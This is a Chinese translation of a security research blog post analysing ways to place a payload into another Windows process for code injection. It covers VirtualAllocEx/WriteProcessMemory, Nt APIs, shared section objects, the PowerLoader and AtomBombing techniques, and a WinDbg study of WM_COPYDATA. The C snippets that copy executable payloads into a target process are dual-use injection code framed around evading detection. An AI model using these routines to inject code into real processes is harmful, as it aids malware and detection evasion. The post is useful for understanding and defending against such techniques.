> 原文链接: https://www.anquanke.com//post/id/151840 


# Windows进程注入payload分析


                                阅读量   
                                **146161**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者modexp，文章来源：modexp.wordpress.com
                                <br>原文地址：[https://modexp.wordpress.com/2018/07/15/process-injection-sharing-payload/](https://modexp.wordpress.com/2018/07/15/process-injection-sharing-payload/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01e738d0a0481d3464.jpg)](https://p4.ssl.qhimg.com/t01e738d0a0481d3464.jpg)

## 前言

上次一篇文章讨论了[编写进程注入payload](https://modexp.wordpress.com/2018/07/12/process-injection-writing-payload/)时的一些问题。本文的目的是讨论将payload部署到目标进程的内存空间以便执行。我们可以使用传统的Win32 API来完成这个任务，有些读者可能已经对此很熟悉了，但是使用非常规方法也有可能具有创造性。例如，我们可以使用API来执行它们原本不想要的读写操作，这可能有助于避免检测。部署和执行payload的方法有多种，但并不是所有的方法都简单易用。让我们首先关注传统的API，它虽然相对容易检测，但在攻击者中仍然很受欢迎。

下面是来自Sysinals的[VMMap](https://docs.microsoft.com/en-us/sysinternals/downloads/vmmap)屏幕截图，显示了为我将要处理的系统(Windows 10)分配的内存类型。其中一些内存有可能用于存储payload。

[![](https://p4.ssl.qhimg.com/t01e343112eebbb832f.png)](https://p4.ssl.qhimg.com/t01e343112eebbb832f.png)



## 分配虚拟内存

每个进程都有自己的虚拟地址空间。共享内存存在于进程之间，但一般来说，进程A不应该能够在没有内核帮助的情况下查看进程B的虚拟内存。当然，内核可以看到所有进程的虚拟内存，因为它必须执行虚拟内存到物理内存的转换。进程A可以使用虚拟内存API在进程B的地址空间中分配新的虚拟内存，然后由内核处理。有些读者可能熟悉在另一个进程的虚拟内存中部署payload的步骤：
1. 使用OpenProcess或NtOpenProcess打开目标进程。
1. 使用VirtualAllocEx或NtAllocateVirtualMemory在目标进程中分配eXecute-Read-Write (XRW)内存。
1. 使用WriteProcessMemory或NtWriteVirtualMemory将payload复制到新内存。
1. 执行payload。
1. 使用VirtualFreeEx或NtFreeVirtualMemory在目标进程中取消分配XRW内存。
1. 使用CloseHandle或NtClose关闭目标进程句柄。
使用Win32 API。这只显示XRW内存的分配和将payload写入新内存。

```
PVOID CopyPayload1(HANDLE hp, LPVOID payload, ULONG payloadSize)`{`
    LPVOID ptr=NULL;
    SIZE_T tmp;

    // 1. allocate memory
    ptr = VirtualAllocEx(hp, NULL, 
      payloadSize, MEM_COMMIT|MEM_RESERVE,
      PAGE_EXECUTE_READWRITE);

    // 2. write payload
    WriteProcessMemory(hp, ptr, 
      payload, payloadSize, &amp;tmp);

    return ptr;
`}`
```

或者使用Nt/Zw API。

```
LPVOID CopyPayload2(HANDLE hp, LPVOID payload, ULONG payloadSize)`{`
    LPVOID   ptr=NULL;
    ULONG    len=payloadSize;
    NTSTATUS nt;
    ULONG    tmp;

    // 1. allocate memory
    NtAllocateVirtualMemory(hp, &amp;ptr, 0, 
      &amp;len, MEM_COMMIT|MEM_RESERVE,
      PAGE_EXECUTE|PAGE_READWRITE);

    // 2. write payload
    NtWriteVirtualMemory(hp, ptr, 
      payload, payloadSize, &amp;tmp);

    return ptr;
`}`
```

虽然这里没有显示，但可能会使用其他操作来删除虚拟内存的写入权限。



## 创建section object

另一种方法是使用section object。微软对此有何说明？

> section object表示可以共享的内存段。进程可以使用section object与其他进程共享其内存地址空间的一部分。section object还提供了进程可以将文件映射到其内存地址空间的机制。

虽然在常规应用程序中使用这些API表明存在恶意，但攻击者将继续使用它们进行进程注入。
1. 使用NtCreateBroker创建一个新的section object，并将其分配给S。
1. 使用NtMapViewOfSection映射攻击进程的S视图，并分配给B1。
1. 使用NtMapViewOfSection映射目标进程的S视图，并分配给B2。
1. 将payload复制到B1。
1. 映射B1。
1. 关闭S
1. 返回指向B2的指针。
```
LPVOID CopyPayload3(HANDLE hp, LPVOID payload, ULONG payloadSize)`{`
    HANDLE        s;
    LPVOID        ba1=NULL, ba2=NULL;
    ULONG         vs=0;
    LARGE_INTEGER li;

    li.HighPart = 0;
    li.LowPart  = payloadSize;

    // 1. create a new section
    NtCreateSection(&amp;s, SECTION_ALL_ACCESS, 
      NULL, &amp;li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // 2. map view of section for current process
    NtMapViewOfSection(s, GetCurrentProcess(),
      &amp;ba1, 0, 0, 0, &amp;vs, ViewShare,
      0, PAGE_EXECUTE_READWRITE);

    // 3. map view of section for target process  
    NtMapViewOfSection(s, hp, &amp;ba2, 0, 0, 0, 
      &amp;vs, ViewShare, 0, PAGE_EXECUTE_READWRITE); 

    // 4. copy payload to section of memory
    memcpy(ba1, payload, payloadSize);

    // 5. unmap memory in the current process
    ZwUnmapViewOfSection(GetCurrentProcess(), ba1);

    // 6. close section
    ZwClose(s);

    // 7. return pointer to payload in target process space
    return (PBYTE)ba2;
`}`
```



## 使用现有的section object和ROP链

PowerLoader恶意程序使用由Explorer.exe创建的现有共享对象来存储payload，但由于对象(读写)的权限，如果不使用面向返回的编程(ROP)链，无法直接执行代码。可以将payload复制到内存中，但如果没有一些额外的技巧，就无法执行它。

PowerLoader使用以下section名进行代码注入：

```
"BaseNamedObjectsShimSharedMemory"
"BaseNamedObjectswindows_shell_global_counters"
"BaseNamedObjectsMSCTF.Shared.SFM.MIH"
"BaseNamedObjectsMSCTF.Shared.SFM.AMF"
"BaseNamedObjectsUrlZonesSM_Administrator"
"BaseNamedObjectsUrlZonesSM_SYSTEM"
```
1. 使用NtOpenSection打开目标进程中的现有内存段
1. 使用NtMapViewOfSection映射section视图
1. 将payload复制到内存
1. 使用ROP链执行


## UI共享内存

Ensilo使用[PowerLoaderEx](https://github.com/BreakingMalware/PowerLoaderEx)演示了使用UI共享内存执行进程。[Steroids注入：无密码的代码注入和0day技术](https://www.slideshare.net/enSilo/injection-on-steroids-codeless-code-injection-and-0day-techniques) 描述了更多关于它如何工作的细节。它使用桌面堆栈将payload注入explorer.exe。

阅读MSDN上的[桌面堆栈概述](https://blogs.msdn.microsoft.com/ntdebugging/2007/01/04/desktop-heap-overview/)，我们可以看到用户界面的进程之间已经有共享内存。

每个桌面对象都有一个与之关联的桌面堆栈。桌面堆栈存储某些用户界面对象，如窗口、菜单和钩子。当应用程序需要一个用户界面对象时，调用user32.dll中的函数来分配这些对象。如果应用程序不依赖于user32.dll，则不使用桌面堆栈。让我们来看一个简单的应用程序如何使用桌面堆栈的示例。



## 使用code cave

基于主机的入侵防御系统(Host Intrusion Prevention Systems/HIPS)将VirtualAllocEx/WriteProcessMemory的使用为可疑活动，这可能是PowerLoader的作者使用现有部分对象的原因。PowerLoader很可能启发了[AtomBombing](https://github.com/BreakingMalwareResearch/atom-bombing)背后的作者使用动态链接库(DLL)中的code cave来存储payload，并使用ROP链执行。

AtomBombing使用GlobalAddAtom、GlobalGetAtomName和NtQueueApcThread的组合将payload部署到目标进程中。执行是使用ROP链和SetThreadContext完成的。如果不使用标准方法，还有什么其他方法可以部署payload呢？

进程间通信(IPC)可用于与另一个进程共享数据。实现这一目标的一些方法包括：
- Clipboard (WM_PASTE)
- Data Copy (WM_COPYDATA)
- Named pipes
- Component Object Model (COM)
- Remote Procedure Call (RPC)
- Dynamic Data Exchange (DDE)
为了完成本文，我决定检查WM_COPYDATA，但是事后看来，我认为COM可能是更好的方式。

可以通过WM_COPYDATA消息在GUI进程之间合法地共享数据，但是它可以用于进程注入吗？SendMessage和PostMessage是两种这样的API，可用于将数据写入远程进程空间，而无需显式打开目标进程并使用虚拟内存API在那里复制数据。

Tarjei Mandt在Blackhat 2011上展示的[通过User-Mode回调进行的内核攻击](http://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf) 使我研究了使用位于进程环境块(PEB)中的KernelCallbackTable进行进程注入的可能性。当user32.dll加载到GUI进程中时，该字段被初始化为一个函数数组，这是我最初开始了解内核如何发送窗口消息的地方。

将WinDbg附加到记事本上，获取PEB的地址。

```
0:001&gt; !peb
!peb
PEB at 0000009832e49000
```

将其转储到windows调试器中将显示以下详细信息。我们感兴趣的是KernelCallbackTable，所以我已经去掉了大部分字段。

```
0:001&gt; dt !_PEB 0000009832e49000
ntdll!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''

    // details stripped out

   +0x050 ReservedBits0    : 0y0000000000000000000000000 (0)
   +0x054 Padding1         : [4]  ""
   +0x058 KernelCallbackTable : 0x00007ffd6afc3070 Void
   +0x058 UserSharedInfoPtr : 0x00007ffd6afc3070 Void
```

如果我们使用转储符号命令转储地址0x00007ffd6afc3070，就会看到对USER32!apfnDispatch的引用。

```
0:001&gt; dps $peb+58
0000009832e49058  00007ffd6afc3070 USER32!apfnDispatch
0000009832e49060  0000000000000000
0000009832e49068  0000029258490000
0000009832e49070  0000000000000000
0000009832e49078  00007ffd6c0fc2e0 ntdll!TlsBitMap
0000009832e49080  000003ffffffffff
0000009832e49088  00007df45c6a0000
0000009832e49090  0000000000000000
0000009832e49098  00007df45c6a0730
0000009832e490a0  00007df55e7d0000
0000009832e490a8  00007df55e7e0228
0000009832e490b0  00007df55e7f0650
0000009832e490b8  0000000000000001
0000009832e490c0  ffffe86d079b8000
0000009832e490c8  0000000000100000
0000009832e490d0  0000000000002000
```

仔细检查USER32!apfnDispatch可以发现一系列函数。

```
0:001&gt; dps USER32!apfnDispatch

00007ffd6afc3070  00007ffd6af62bd0 USER32!_fnCOPYDATA
00007ffd6afc3078  00007ffd6afbae70 USER32!_fnCOPYGLOBALDATA
00007ffd6afc3080  00007ffd6af60420 USER32!_fnDWORD
00007ffd6afc3088  00007ffd6af65680 USER32!_fnNCDESTROY
00007ffd6afc3090  00007ffd6af696a0 USER32!_fnDWORDOPTINLPMSG
00007ffd6afc3098  00007ffd6afbb4a0 USER32!_fnINOUTDRAG
00007ffd6afc30a0  00007ffd6af65d40 USER32!_fnGETTEXTLENGTHS
00007ffd6afc30a8  00007ffd6afbb220 USER32!_fnINCNTOUTSTRING
00007ffd6afc30b0  00007ffd6afbb750 USER32!_fnINCNTOUTSTRINGNULL
00007ffd6afc30b8  00007ffd6af675c0 USER32!_fnINLPCOMPAREITEMSTRUCT
00007ffd6afc30c0  00007ffd6af641f0 USER32!__fnINLPCREATESTRUCT
00007ffd6afc30c8  00007ffd6afbb2e0 USER32!_fnINLPDELETEITEMSTRUCT
00007ffd6afc30d0  00007ffd6af6bc00 USER32!__fnINLPDRAWITEMSTRUCT
00007ffd6afc30d8  00007ffd6afbb330 USER32!_fnINLPHELPINFOSTRUCT
00007ffd6afc30e0  00007ffd6afbb330 USER32!_fnINLPHELPINFOSTRUCT
00007ffd6afc30e8  00007ffd6afbb430 USER32!_fnINLPMDICREATESTRUCT
```

第一个函数USER32!_fnCOPYDATA在进程A向属于进程B的窗口发送WM_COPYDATA消息时调用。内核将向目标窗口句柄发送消息，包括其他参数，这些消息将由与其关联的windows进程处理。

```
0:001&gt; u USER32!_fnCOPYDATA
USER32!_fnCOPYDATA:
00007ffd6af62bd0 4883ec58        sub     rsp,58h
00007ffd6af62bd4 33c0            xor     eax,eax
00007ffd6af62bd6 4c8bd1          mov     r10,rcx
00007ffd6af62bd9 89442438        mov     dword ptr [rsp+38h],eax
00007ffd6af62bdd 4889442440      mov     qword ptr [rsp+40h],rax
00007ffd6af62be2 394108          cmp     dword ptr [rcx+8],eax
00007ffd6af62be5 740b            je      USER32!_fnCOPYDATA+0x22 (00007ffd6af62bf2)
00007ffd6af62be7 48394120        cmp     qword ptr [rcx+20h],rax
```

在这个函数上设置断点并继续执行。

```
0:001&gt; bp USER32!_fnCOPYDATA
0:001&gt; g
```

下面的代码将把WM_COPYDATA消息发送到记事本。编译并运行它。

```
int main(void)`{`
  COPYDATASTRUCT cds;
  HWND           hw;
  WCHAR          msg[]=L"I don't know what to say!n";

  hw = FindWindowEx(0,0,L"Notepad",0);

  if(hw!=NULL)`{`   
    cds.dwData = 1;
    cds.cbData = lstrlen(msg)*2;
    cds.lpData = msg;

    // copy data to notepad memory space
    SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&amp;cds);
  `}`
  return 0;
`}`
```

一旦该代码执行，它将在发送WM_COPYDATA消息之前尝试查找记事本的窗口句柄，这将触发调试器中的断点。调用堆栈显示调用的发源地，在本例中是来自KiUserCallbackDispatcherContinue。根据调用约定，参数放在RCX、RDX、R8和R9中。

```
Breakpoint 0 hit
USER32!_fnCOPYDATA:
00007ffd6af62bd0 4883ec58        sub     rsp,58h
0:000&gt; k
 # Child-SP          RetAddr           Call Site
00 0000009832caf618 00007ffd6c03dbc4 USER32!_fnCOPYDATA
01 0000009832caf620 00007ffd688d1144 ntdll!KiUserCallbackDispatcherContinue
02 0000009832caf728 00007ffd6af61b0b win32u!NtUserGetMessage+0x14
03 0000009832caf730 00007ff79cc13bed USER32!GetMessageW+0x2b
04 0000009832caf790 00007ff79cc29333 notepad!WinMain+0x291
05 0000009832caf890 00007ffd6bb23034 notepad!__mainCRTStartup+0x19f
06 0000009832caf950 00007ffd6c011431 KERNEL32!BaseThreadInitThunk+0x14
07 0000009832caf980 0000000000000000 ntdll!RtlUserThreadStart+0x21

0:000&gt; r
rax=00007ffd6af62bd0 rbx=0000000000000000 rcx=0000009832caf678
rdx=00000000000000b0 rsi=0000000000000000 rdi=0000000000000000
rip=00007ffd6af62bd0 rsp=0000009832caf618 rbp=0000009832caf829
 r8=0000000000000000  r9=00007ffd6afc3070 r10=0000000000000000
r11=0000000000000244 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
USER32!_fnCOPYDATA:
00007ffd6af62bd0 4883ec58        sub     rsp,58h
```

将第一个参数的内容转储到RCX寄存器中，显示了示例程序发送的一些可识别数据。notepad!NPWndProc显然是与接收WM_COPYDATA的目标窗口相关联的回调过程。

```
0:000&gt; dps rcx
0000009832caf678  00000038000000b0
0000009832caf680  0000000000000001
0000009832caf688  0000000000000000
0000009832caf690  0000000000000070
0000009832caf698  0000000000000000
0000009832caf6a0  0000029258bbc070
0000009832caf6a8  000000000000004a       // WM_COPYDATA
0000009832caf6b0  00000000000c072e
0000009832caf6b8  0000000000000001
0000009832caf6c0  0000000000000001
0000009832caf6c8  0000000000000034
0000009832caf6d0  0000000000000078
0000009832caf6d8  00007ff79cc131b0 notepad!NPWndProc
0000009832caf6e0  00007ffd6c039da0 ntdll!NtdllDispatchMessage_W
0000009832caf6e8  0000000000000058
0000009832caf6f0  006f006400200049
```

传递给fnCOPYDATA的结构不是调试符号的一部分，但是下面是我们所看到的:

```
typedef struct _CAPTUREBUF `{`
    DWORD cbCallback;
    DWORD cbCapture;
    DWORD cCapturedPointers;
    PBYTE pbFree;              
    DWORD offPointers;
    PVOID pvVirtualAddress;
`}` CAPTUREBUF, *PCAPTUREBUF;

typedef struct _FNCOPYDATAMSG `{`
    CAPTUREBUF     CaptureBuf;
    PWND           pwnd;
    UINT           msg;
    HWND           hwndFrom;
    BOOL           fDataPresent;
    COPYDATASTRUCT cds;
    ULONG_PTR      xParam;
    PROC           xpfnProc;
`}` FNCOPYDATAMSG;
```

继续并检查寄存器的内容。

```
0:000&gt; r
r
rax=00007ffd6c039da0 rbx=0000000000000000 rcx=00007ff79cc131b0
rdx=000000000000004a rsi=0000000000000000 rdi=0000000000000000
rip=00007ffd6af62c16 rsp=0000009832caf5c0 rbp=0000009832caf829
 r8=00000000000c072e  r9=0000009832caf6c0 r10=0000009832caf678
r11=0000000000000244 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
USER32!_fnCOPYDATA+0x46:
00007ffd6af62c16 498b4a28        mov     rcx,qword ptr [r10+28h] ds:0000009832caf6a0=0000029258bbc070

0:000&gt; u rcx
notepad!NPWndProc:
00007ff79cc131b0 4055            push    rbp
00007ff79cc131b2 53              push    rbx
00007ff79cc131b3 56              push    rsi
00007ff79cc131b4 57              push    rdi
00007ff79cc131b5 4154            push    r12
00007ff79cc131b7 4155            push    r13
00007ff79cc131b9 4156            push    r14
00007ff79cc131bb 4157            push    r15
```

我们看到一个指向COPYDATASTRUCT的指针被放置在R9中。

```
0:000&gt; dps r9
0000009832caf6c0  0000000000000001
0000009832caf6c8  0000000000000034
0000009832caf6d0  0000009832caf6f0
0000009832caf6d8  00007ff79cc131b0 notepad!NPWndProc
0000009832caf6e0  00007ffd6c039da0 ntdll!NtdllDispatchMessage_W
0000009832caf6e8  0000000000000058
0000009832caf6f0  006f006400200049
0000009832caf6f8  002000740027006e
0000009832caf700  0077006f006e006b
0000009832caf708  0061006800770020
0000009832caf710  006f007400200074
0000009832caf718  0079006100730020
0000009832caf720  00000000000a0021
0000009832caf728  00007ffd6af61b0b USER32!GetMessageW+0x2b
0000009832caf730  0000009800000000
0000009832caf738  0000000000000001
```

这个结构是在调试符号中定义的，所以我们可以转储它，显示它包含的值。

```
0:000&gt; dt uxtheme!COPYDATASTRUCT 0000009832caf6c0
   +0x000 dwData           : 1
   +0x008 cbData           : 0x34
   +0x010 lpData           : 0x0000009832caf6f0 Void
```

最后，检查应该包含从进程A发送的字符串的lpData字段。

```
0:000&gt; du poi(0000009832caf6c0+10)
0000009832caf6f0  "I don't know what to say!."
```

我们可以看到这个地址属于创建线程时分配的堆栈。

```
0:000&gt; !address 0000009832caf6f0

Usage:                  Stack
Base Address:           0000009832c9f000
End Address:            0000009832cb0000
Region Size:            0000000000011000 (  68.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        0000009832c30000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              ~0k
```

检查位于线程环境块(Thread Environment Block/TEB)中的线程信息块(Thread Information Block/TIB)为我们提供了StackBase和StackLimit。

```
0:001&gt; dx -r1 (*((uxtheme!_NT_TIB *)0x9832e4a000))
(*((uxtheme!_NT_TIB *)0x9832e4a000))                 [Type: _NT_TIB]
    [+0x000] ExceptionList    : 0x0 [Type: _EXCEPTION_REGISTRATION_RECORD *]
    [+0x008] StackBase        : 0x9832cb0000 [Type: void *]
    [+0x010] StackLimit       : 0x9832c9f000 [Type: void *]
    [+0x018] SubSystemTib     : 0x0 [Type: void *]
    [+0x020] FiberData        : 0x1e00 [Type: void *]
    [+0x020] Version          : 0x1e00 [Type: unsigned long]
    [+0x028] ArbitraryUserPointer : 0x0 [Type: void *]
    [+0x030] Self             : 0x9832e4a000 [Type: _NT_TIB *]
```

好的，我们可以使用WM_COPYDATA将payload部署到一个目标进程(如果它有一个附加的GUI)，但是除非我们能够执行它，否则它是没有用的。此外，堆栈是一个易变的内存区域，因此不可靠，无法用作code cave。要执行它，需要找到确切的地址并使用ROP链。当ROP链被执行时，不能保证payload仍然是完整的。因此，在这种情况下，我们可能不能使用WM_COPYDATA，但需要记住的是，可能有许多方法可以使用合法API与另一个进程共享payload，这些API比使用WriteProcessMemory或NtWriteVirtualMemory更不可疑。

对于WM_COPYDATA，仍然需要确定payload堆栈中的确切地址。可以使用ThreadBasicInformation类通过NtQueryThreadInformationAPI检索线程环境块(TEB)的内容。读取TebAddress后，可以读取StackLimit和StackBase值。在任何情况下，堆栈的波动性意味着在执行之前payload可能会被覆盖。



## 总结

避免使用用于部署和执行payload的常规API都会增加检测的难度。PowerLoader在现有的section object中使用了一个code cave，并使用了一个ROP链来执行。PowerLoaderEx是一个PoC，它使用桌面堆栈，而AtomBombing的PoC使用DLL的.data部分中的一个code cave。

审核人：yiwang   编辑：边边
